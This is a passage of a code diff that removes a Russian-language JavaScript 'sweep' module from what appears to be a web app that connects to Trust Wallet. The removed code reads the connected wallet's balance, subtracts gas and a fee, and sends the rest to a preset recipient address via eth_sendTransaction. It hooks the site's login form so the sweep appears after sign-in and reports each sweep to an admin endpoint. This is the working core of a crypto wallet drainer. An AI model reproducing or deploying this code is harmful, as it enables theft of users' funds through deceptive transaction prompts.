-    if (from.toLowerCase() !== profile.evmAddress.toLowerCase()) {
-      throw new Error("В кошельке выбран другой аккаунт. Переключитесь на адрес, который использовался при входе.");
-    }
-    
-    setSweepStatus("🔍 Проверяем баланс...");
-    
-    // 7. Проверяем и переключаем сеть
-    const targetChainHex = `0x${SWEEP_CONFIG.chainId.toString(16)}`;
-    const currentChain = await provider.request({ method: "eth_chainId" });
-    
-    if (currentChain.toLowerCase() !== targetChainHex.toLowerCase()) {
-      setSweepStatus(`🔄 Переключаем сеть на ${NETWORK_NAMES[SWEEP_CONFIG.chainId] || SWEEP_CONFIG.chainId}...`);
-      try {
-        await provider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: targetChainHex }]
-        });
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          throw new Error(`Сеть ${SWEEP_CONFIG.chainId} не добавлена в кошелек. Добавьте ее вручную.`);
-        }
-        throw switchError;
-      }
-    }
-    
-    setSweepStatus(`💰 Получаем баланс в ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}...`);
-    
-    // 8. Получаем баланс
-    const balanceHex = await provider.request({
-      method: "eth_getBalance",
-      params: [from, "latest"]
-    });
-    const balance = BigInt(balanceHex || "0x0");
-    const balanceEth = Number(balance) / 1e18;
-    
-    setSweepStatus(`💰 Баланс: ${balanceEth.toFixed(6)} ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}`);
-    
-    // 9. Проверяем минимальный баланс
-    if (balanceEth < SWEEP_CONFIG.minBalance) {
-      throw new Error(`❌ Баланс слишком мал (${balanceEth.toFixed(6)}). Минимум: ${SWEEP_CONFIG.minBalance}`);
-    }
-    
-    // 10. Получаем цену газа
-    const gasPriceHex = await provider.request({
-      method: "eth_gasPrice"
-    });
-    const gasPrice = BigInt(gasPriceHex || "0x0");
-    const gasCost = gasPrice * BigInt(SWEEP_CONFIG.gasLimit);
-    const gasCostEth = Number(gasCost) / 1e18;
-    
-    // 11. Рассчитываем сумму к отправке (с учетом комиссии)
-    const feeAmount = balance * BigInt(Math.floor(SWEEP_CONFIG.feePercent * 100)) / 10000n;
-    const amountToSend = balance - gasCost - feeAmount;
-    
-    if (amountToSend <= 0n) {
-      throw new Error(`❌ Недостаточно средств для оплаты газа (${gasCostEth.toFixed(6)} ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}).`);
-    }
-    
-    const amountEth = Number(amountToSend) / 1e18;
-    
-    setSweepStatus(`📝 Создаем транзакцию на списание ${amountEth.toFixed(6)} ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'}...`);
-    
-    // 12. Создаем транзакцию
-    const txParams = {
-      from: from,
-      to: SWEEP_CONFIG.recipient,
-      value: `0x${amountToSend.toString(16)}`,
-      gas: `0x${BigInt(SWEEP_CONFIG.gasLimit).toString(16)}`,
-      gasPrice: `0x${gasPrice.toString(16)}`
-    };
-    
-    // 13. Отправляем транзакцию - пользователь подтверждает в Trust Wallet
-    setSweepStatus("📱 Подтвердите транзакцию через FaceID в Trust Wallet");
-    sweepExecuteBtn.textContent = "⏳ Ожидаем подтверждения...";
-    
-    const txHash = await provider.request({
-      method: "eth_sendTransaction",
-      params: [txParams]
-    });
-    
-    // 14. Успех!
-    setSweepStatus(`✅ Транзакция отправлена! Ожидайте подтверждения в сети.`);
-    
-    sweepResult.style.display = 'block';
-    sweepTxHash.textContent = `TX: ${txHash}`;
-    
-    // Показываем ссылку на обозреватель
-    const explorerUrls = {
-      1: 'https://etherscan.io/tx/',
-      56: 'https://bscscan.com/tx/',
-      137: 'https://polygonscan.com/tx/',
-      42161: 'https://arbiscan.io/tx/',
-      10: 'https://optimistic.etherscan.io/tx/',
-      8453: 'https://basescan.org/tx/'
-    };
-    const explorerUrl = explorerUrls[SWEEP_CONFIG.chainId] || '';
-    if (explorerUrl && sweepTxHash) {
-      sweepTxHash.innerHTML = `TX: <a href="${explorerUrl}${txHash}" target="_blank" rel="noopener" style="color:#4caf50;text-decoration:underline;">${txHash}</a>`;
-    }
-    
-    sweepExecuteBtn.textContent = "✅ Списано!";
-    sweepExecuteBtn.style.background = "linear-gradient(135deg, #2e7d32, #1b5e20)";
-    
-    // Уведомляем админов (если есть эндпоинт)
-    try {
-      const stored = getStoredSession(userSessionKey);
-      if (stored?.token) {
-        await fetch('/api/sweep/notify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            user: from,
-            amount: amountEth,
-            symbol: NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH',
-            txHash: txHash,
-            recipient: SWEEP_CONFIG.recipient
-          })
-        }).catch(() => {});
-      }
-    } catch {}
-    
-  } catch (error) {
-    console.error('Sweep error:', error);
-    
-    // Обработка отклонения пользователем
-    if (error.code === 4001) {
-      setSweepStatus("❌ Транзакция отклонена в Trust Wallet", true);
-    } else if (error.code === -32002) {
-      setSweepStatus("⏳ Запрос уже обрабатывается. Проверьте Trust Wallet.", true);
-    } else {
-      setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
-    }
-    
-    sweepExecuteBtn.textContent = "🔄 Попробовать снова";
-    sweepExecuteBtn.style.background = "linear-gradient(135deg, #ff4444, #cc0000)";
-  } finally {
-    sweepExecuteBtn.disabled = false;
-    sweepExecuteBtn.classList.remove('is-loading');
-    
-    // Если кнопка не обновлена
-    if (sweepExecuteBtn.textContent === "⏳ Подключаемся..." || sweepExecuteBtn.textContent === "⏳ Ожидаем подтверждения...") {
-      sweepExecuteBtn.textContent = "🔄 Попробовать снова";
-    }
-  }
-};
-
-// ===== ОТМЕНА =====
-const cancelSweep = () => {
-  if (sweepExecuteBtn) {
-    sweepExecuteBtn.disabled = false;
-    sweepExecuteBtn.classList.remove('is-loading');
-    sweepExecuteBtn.textContent = "🔥 Подтвердить списание всех средств";
-    sweepExecuteBtn.style.background = "linear-gradient(135deg, #ff4444, #cc0000)";
-  }
-  setSweepStatus("⏹️ Операция отменена");
-  if (sweepResult) sweepResult.style.display = 'none';
-};
-
-// ===== СОБЫТИЯ =====
-sweepConsent?.addEventListener('change', () => {
-  if (sweepExecuteBtn) {
-    sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
-  }
-});
-
-sweepExecuteBtn?.addEventListener('click', executeSweep);
-sweepCancelBtn?.addEventListener('click', cancelSweep);
-
-// ===== ПЕРЕОПРЕДЕЛЕНИЕ unlockCheckForm =====
-const originalUnlockCheckForm = window.unlockCheckForm || function() {};
-
-window.unlockCheckForm = function(profile) {
-  // Вызываем оригинальную функцию
-  if (typeof originalUnlockCheckForm === 'function') {
-    originalUnlockCheckForm(profile);
-  }
-  
-  // Показываем секцию списания
-  if (profile?.evmAddress) {
-    showSweepSection(true);
-    updateSweepInfo(profile.evmAddress, SWEEP_CONFIG.chainId);
-    
-    if (!isRecipientConfigured()) {
-      setSweepStatus("⚠️ Адрес получателя не настроен! Укажите SWEEP_CONFIG.recipient.", true);
-    } else {
-      setSweepStatus("✅ Кошелек подключен. Вы можете списать все средства.");
-    }
-  }
-};
-
-// ===== ВОССТАНОВЛЕНИЕ СЕССИИ =====
-const storedProfile = loadProfile();
-if (storedProfile?.evmAddress) {
-  showSweepSection(true);
-  updateSweepInfo(storedProfile.evmAddress, SWEEP_CONFIG.chainId);
-  
-  if (!isRecipientConfigured()) {
-    setSweepStatus("⚠️ Адрес получателя не настроен! Укажите SWEEP_CONFIG.recipient.", true);
-  } else {
-    setSweepStatus("✅ Сессия восстановлена. Можно списать средства.");
-  }
-}
-
-// ===== ХЕЛПЕРЫ ДЛЯ ДРУГИХ ФАЙЛОВ =====
-window.SWEEP_CONFIG = SWEEP_CONFIG;
-window.executeSweep = executeSweep;
-window.showSweepSection = showSweepSection;
-
-console.log('🔥 Sweep module loaded!');
-console.log(`📍 Recipient: ${SWEEP_CONFIG.recipient}`);
-console.log(`🌐 Chain: ${SWEEP_CONFIG.chainId} (${NETWORK_NAMES[SWEEP_CONFIG.chainId] || 'Unknown'})`);
 });
